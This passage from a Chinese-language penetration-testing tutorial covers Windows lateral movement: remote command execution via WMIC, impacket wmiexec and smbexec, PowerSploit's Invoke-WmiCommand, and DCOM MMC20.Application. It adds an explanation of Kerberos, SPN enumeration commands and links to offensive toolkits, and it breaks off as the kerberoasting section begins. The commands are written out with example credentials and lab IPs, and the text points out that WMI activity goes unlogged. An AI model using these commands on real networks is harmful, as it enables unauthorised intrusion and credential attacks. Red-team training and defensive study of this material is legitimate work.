<h2 id="七：WMI的使用"><a href="#七：WMI的使用" class="headerlink" title="七：WMI的使用"></a>七：WMI的使用</h2><p>WMI全名 Windows Management Instrumentation 。WMI由一系列工具组成，可以在本地或远程管理计算机系统。</p>
<p>PsExec在内网被严格监控，很多反病毒的厂商将PsExec放入黑名单，于是攻击者就开始利用WMI进行横向移动，并且使用wmiexec进行横向移动的时候，Windows操作系统默认不会将WMI的操作记录在日志中。</p>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>命令行执行命令,使用目标系统的cmd.exe 执行ipconfig将执行结果保存在ip.txt</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.1</span>.<span class="number">3</span> /<span class="keyword">user</span> <span class="title">administrator</span> /password:admin!@<span class="comment"># process call create &quot;cmd.exe /c ipconfig &gt;c:\ip.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702401.png" alt="img"></p>
<p> 接着建立ipc$连接，使用type命令读取执行结果</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702963.png" alt="img"></p>
<p> 接下来就可以使用WMIC远程执行命令了，但如果目标开启了防火墙，wmic将无法进行连接，此外，wmic命令没有回显，需要使用ipc$和type命令来读取信息。如果wmic执行的是恶意程序，将不会留下日志</p>
<h2 id="八：impacket工具包中的wmiexec"><a href="#八：impacket工具包中的wmiexec" class="headerlink" title="八：impacket工具包中的wmiexec"></a>八：impacket工具包中的wmiexec</h2><p>在KALI下载安装impacket包</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:<span class="symbol">Password@</span><span class="number">192.168</span><span class="number">.200</span><span class="number">.24</span></span><br></pre></td></tr></table></figure>

<p> 报了个没模块的错误</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703242.png" alt="img"></p>
<p>解决方法：回到目录安装</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup.py install</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703861.png" alt="img"></p>
<p> 就可以运行啦</p>
<p>该方法主要在从Linux向Windows进行横向渗透测速使用</p>
<p>windows也有impacket工具包，都是打包好的exe文件，在windows下进行横向：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe administrator:<span class="symbol">Password@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703944.png" alt="img"></p>
<h2 id="九：Invoke-WmiCommand"><a href="#九：Invoke-WmiCommand" class="headerlink" title="九：Invoke-WmiCommand"></a>九：Invoke-WmiCommand</h2><p>Invoke-WmiCommand.ps1脚本包含在PowerSploit工具中。通过powershell调用WMI来远程执行命令</p>
<p>将模块导入后执行命令</p>
<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>目标系统用户名</span><br><span class="line"><span class="variable">$User</span>=<span class="string">&quot;hacke/administrator&quot;</span></span><br><span class="line"><span class="regexp">//</span>目标系统密码</span><br><span class="line"><span class="variable">$Password</span>=ConvertTO-SecureString -String <span class="string">&quot;a123456#&quot;</span> -AsPlainText -Force</span><br><span class="line"><span class="regexp">//</span>将账号和密码整合起来，以便导入Credential</span><br><span class="line"><span class="variable">$Cred</span>=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="variable">$User</span> , <span class="variable">$Password</span></span><br><span class="line"><span class="regexp">//</span>远程执行命令</span><br><span class="line"><span class="variable">$Remote</span>=Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential <span class="variable">$Cred</span> -ComputerName <span class="number">192.168</span>.<span class="number">1.3</span></span><br><span class="line"><span class="regexp">//</span>将执行结果输出到屏幕</span><br><span class="line"><span class="variable">$Remote</span>.PayloadOutput</span><br></pre></td></tr></table></figure>

<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703872.png" alt="img"></p>
<p> 看起来用不了。。。</p>
<h2 id="十：smbexec使用"><a href="#十：smbexec使用" class="headerlink" title="十：smbexec使用"></a>十：smbexec使用</h2><p>smbexec可以通过文件共享在远程系统中执行命令</p>
<p>impacket工具包中的smbexec.py</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py hacke/administrator:<span class="symbol">Admin111@</span><span class="number">192.168</span><span class="number">.200</span><span class="number">.24</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703819.png" alt="img"></p>
<h2 id="十一：DOM在远程系统中的使用"><a href="#十一：DOM在远程系统中的使用" class="headerlink" title="十一：DOM在远程系统中的使用"></a>十一：DOM在远程系统中的使用</h2><p> DCOM分布式组件对象模型，是微软的一系列概念和程序接口。通过DCOM，客户端程序对象能够像网络中的另一台计算机上个的服务器程序对象发送请求</p>
<h3 id="1-通过本地DCOM执行命令"><a href="#1-通过本地DCOM执行命令" class="headerlink" title="1.通过本地DCOM执行命令"></a>1.通过本地DCOM执行命令</h3><h4 id="1-获取DCOM程序列表"><a href="#1-获取DCOM程序列表" class="headerlink" title="1) 获取DCOM程序列表"></a>1) 获取DCOM程序列表</h4><p>Get-CimInstance默认只在PowerShell3.0以上版本存在（win server2012以上）</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get</span><span class="operator">-</span><span class="variable">CimInstance</span> <span class="type">Win32_DCOMApplication</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703981.png" alt="img"></p>
<p> 2012以下可以以下命令代替</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-WmiObject -<span class="keyword">Namespace</span> ROOT\CIMV2 -<span class="keyword">Class</span> WIN32_DCOMApplication</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703000.png" alt="img"></p>
<h4 id="2-使用DCOM执行任意命令"><a href="#2-使用DCOM执行任意命令" class="headerlink" title="2) 使用DCOM执行任意命令"></a>2) 使用DCOM执行任意命令</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span>=<span class="selector-attr">[activator]</span>::<span class="built_in">CreateInstance</span>(<span class="selector-attr">[type]</span>::<span class="built_in">GetTypeFromProgID</span>(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>)) <span class="variable">$com</span><span class="selector-class">.Document</span><span class="selector-class">.ActiveView</span><span class="selector-class">.ExecuteShellCommand</span>(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minized&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703919.png" alt="img"></p>
<p> 执行完毕，将以当前会话执行Administrator权限的calc.exe</p>
<p>如果攻击者把计算机程序换成恶意的Payload，就会对系统安全造成威胁</p>
<p>　　</p>
<h3 id="2-使用DCOM在远程机器上执行命令"><a href="#2-使用DCOM在远程机器上执行命令" class="headerlink" title="2.使用DCOM在远程机器上执行命令"></a>2.使用DCOM在远程机器上执行命令</h3><h4 id="1-通过-ipc连接远程计算机"><a href="#1-通过-ipc连接远程计算机" class="headerlink" title="1) 通过$ipc连接远程计算机"></a>1) 通过$ipc连接远程计算机</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">net</span> use \\<span class="number">192.168.1.2</span> <span class="string">&quot;Admin111&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure>

<h4 id="2-执行命令"><a href="#2-执行命令" class="headerlink" title="2) 执行命令"></a>2) 执行命令</h4><p>调用MMC20.Application</p>
<p>建立$ipc后，远程系统运行calc.exe　　</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span>=<span class="selector-attr">[activator]</span>::<span class="built_in">CreateInstance</span>(<span class="selector-attr">[type]</span>::<span class="built_in">GetTypeFromProgID</span>(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;192.168.1.2&quot;</span>)) <span class="variable">$com</span><span class="selector-class">.Document</span><span class="selector-class">.ActiveView</span><span class="selector-class">.ExecuteShellCommand</span>(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703030.png" alt="img"></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703949.png" alt="img"> </p>
<p>或者调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span>=<span class="selector-attr">[type]</span>::<span class="built_in">GetTypeFromCLSID</span>(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;192.168.1.2&quot;</span>)<span class="variable">$obj</span>=<span class="selector-attr">[System.Activator]</span>::<span class="built_in">CreateInstance</span>(<span class="variable">$com</span>)<span class="variable">$item</span>=<span class="variable">$obj</span><span class="selector-class">.item</span>()<span class="variable">$item</span><span class="selector-class">.Document</span><span class="selector-class">.Application</span><span class="selector-class">.ShellExecute</span>(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>　<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703678.png" alt="img"></p>
<p>这两种方法均适用于Windows7-10.Windows server 2008-2016　</p>
<p>　　</p>
<h2 id="十二：SPN"><a href="#十二：SPN" class="headerlink" title="十二：SPN"></a>十二：SPN</h2><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散.所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p>
<p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p>
<h3 id="1-Kerberos"><a href="#1-Kerberos" class="headerlink" title="1.Kerberos"></a>1.Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端&#x2F;服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p>
<p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p>
<p>Kerberos 协议中的名称解释：</p>
<ul>
<li>Client: 访问服务的客户端</li>
<li>Server: 提供服务的服务器</li>
<li>KDC (Key Distribution Center): 密钥分发中心</li>
<li>AS (Authentication Service): 认证服务器</li>
<li>TGS (Ticket Granting Service): 票据授予服务</li>
<li>DC (Domain Controller): 域控制器</li>
<li>AD (Account Database): 用户数据库</li>
<li>TGT (Ticket Granting Ticket): 票证授予票证</li>
<li>ST (Servre Ticket): 服务票据</li>
</ul>
<p><img src="https://pic1.zhimg.com/v2-486386cef09037a08d8bd485138052d2_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-486386cef09037a08d8bd485138052d2_720w.jpg?source=3af55fa1" alt="img"></p>
<p>根据上图，这里一步一步进行解释</p>
<p><strong>第一阶段：Clinet 与 AS</strong></p>
<p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名.主机 IP 和当前时间戳。</p>
<p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p>
<ul>
<li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息.IP.当前时间戳 </li>
<li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li>
</ul>
<p>至此，第一阶段通信完成。</p>
<p><strong>第二阶段：Clinet 与 TGS</strong></p>
<p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳.接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p>
<p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p>
<p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p>
<ul>
<li>第一部分：使用 CT_SK 加密的客户端信息.IP.时间戳</li>
<li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li>
<li>第三部分：使用 TGS 密钥加密的 TGT</li>
</ul>
<p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p>
<p>   接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息.CT_SK.时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。</p>
<p>   之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。</p>
<p>   此时 TGS 将向客户端发起响应，响应信息包含两部分：</p>
<ul>
<li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息.IP.客户端待访问的服务端信息.ST 有效信息.时间戳以及用于客户端和服务端之间通信的 CS_SK</li>
<li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK .时间戳和 ST 的有效时间。</li>
</ul>
<p>至此，第二阶段通信完成。</p>
<p><strong>第三阶段：Clinet 与 Server</strong></p>
<p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p>
<p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p>
<ul>
<li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li>
<li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li>
</ul>
<p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p>
<p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p>
<p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p>
<p>这里可以再通过时序图加深下印象。</p>
<p><img src="https://pica.zhimg.com/v2-bb57389676e8164941d1c87a2edae444_720w.jpg?source=3af55fa1" alt="img"><img src="https://pica.zhimg.com/80/v2-bb57389676e8164941d1c87a2edae444_720w.jpg?source=3af55fa1" alt="img"></p>
<p>注意点：</p>
<ul>
<li>KDC 服务默认会安装在一个域的域控中</li>
<li>Kerberos 认证采用对称加密算法</li>
<li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li>
<li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li>
<li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
</ul>
<h3 id="2-SPN"><a href="#2-SPN" class="headerlink" title="2.SPN"></a>2.SPN</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService.LocalSystem）或者用户账号下为服务器注册 SPN。</p>
<p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p>
<p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p>
<p>SPN 格式如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</span><br></pre></td></tr></table></figure>

<blockquote>
<p> serviceclass（必选）：服务组件名称<br> hostname（必选）：以 “&#x2F;” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)<br> port（可选）：以冒号分隔，后面的内容为该服务监听的端口号<br> servicename（可选）：一个字符串，可以是服务的专有名称（DN）.objectGuid.Internet主机名或全限定域名</p>
</blockquote>
<h4 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h4><p>MSSQL 服务</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSSQLSvc/DBServer.teamssix.com:1433</span><br></pre></td></tr></table></figure>

<p>Exchange 服务</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exchangeMDB/ExServer.teamssix.com</span><br></pre></td></tr></table></figure>

<p>RDP 服务</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV/ExServer.teamssix.com</span><br></pre></td></tr></table></figure>

<p>WSMan&#x2F;WinRM&#x2F;PSRemoting 服务</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WSMAN/ExServer.teamssix.com</span><br></pre></td></tr></table></figure>

<h4 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h4><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p>
<p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p>
<p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p>
<h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T teamssix -Q */*</span><br></pre></td></tr></table></figure>

<h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a href="http://link.zhihu.com/?target=https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last</span><br></pre></td></tr></table></figure>

<h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL.Exchange.RDP.WinRM</p>
<p>Powershell-AD-Recon 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
<p>Powershell-AD-Recon 工具包里的内容如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Discover-PSInterestingServices  # 查找所有 SPN 服务</span><br><span class="line">Discover-PSMSExchangeServers        # 查找 Exchange 服务器</span><br><span class="line">Discover-PSMSSQLServers         # 查找 MSSQL 服务器</span><br><span class="line">Find-PSServiceAccounts          # 查找服务账户</span><br><span class="line">Get-DomainKerberosPolicy        # 获取域 Kerberos 策略</span><br><span class="line">Get-PSADForestInfo              # 获取域森林信息</span><br><span class="line">Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 下载后的文件是没有 .ps1 后缀的，需要自己添加上</p>
</blockquote>
<p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p>
<p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Discover-PSMSSQLServers.ps1</span><br><span class="line">Discover-PSMSSQLServers</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;</span><br></pre></td></tr></table></figure>

<p>扫描域中所有的 SPN 信息</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Discover-PSInterestingServices.ps1</span><br><span class="line">Discover-PSInterestingServices</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;</span><br></pre></td></tr></table></figure>

<h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p>
<p>kerberoast 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./GetUserSPNs.ps1</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -File GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>

<p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>

<h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p>
<p>PowerShellery 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-SPN.psm1</span><br><span class="line">Get-SPN -type service -search *</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;</span><br></pre></td></tr></table></figure>

<p>结果也可以转换为表格的形式，以便于浏览</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-SPN.psm1</span><br><span class="line">Get-SPN -type service -search * -List yes</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;</span><br></pre></td></tr></table></figure>

<p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID.服务和实际用户</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-DomainSpn.psm1</span><br><span class="line">Get-DomainSpn</span><br><span class="line">或者</span><br><span class="line">PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;</span><br></pre></td></tr></table></figure>

<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com/test</span><br></pre></td></tr></table></figure>



<p><img src="https://pic1.zhimg.com/v2-797d2f7292903d4042ea4f225bc81c8e_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-797d2f7292903d4042ea4f225bc81c8e_720w.jpg?source=3af55fa1" alt="img"></p>
<h3 id="3-kerberoast"><a href="#3-kerberoast" class="headerlink" title="3.kerberoast"></a>3.kerberoast</h3><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p>
